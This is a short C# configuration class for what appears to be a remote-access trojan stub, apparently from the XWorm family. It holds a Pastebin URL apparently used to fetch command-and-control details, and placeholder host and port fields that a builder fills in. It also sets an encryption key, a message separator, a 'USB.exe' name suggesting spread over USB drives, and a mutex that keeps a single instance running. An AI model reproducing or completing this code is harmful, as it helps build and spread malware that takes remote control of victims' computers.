using System.Diagnostics;
using System.Threading;

namespace Stub;

public class Settings
{
	public static string PasteUrl = "https://pastebin.com/raw/2L3vs8UY";

	public static string Host = "%ip%";

	public static string Port = "%port%";

	public static string KEY = "<123456789>";

	public static string SPL = "<Xwormmm>";

	public static string USBNM = "USB.exe";

	public static readonly string Mutexx = "PNfnJNqXASy2Le3d";

	public static Mutex _appMutex;

	public static bool usbC;

	public static string current = Process.GetCurrentProcess().MainModule!.FileName;
}
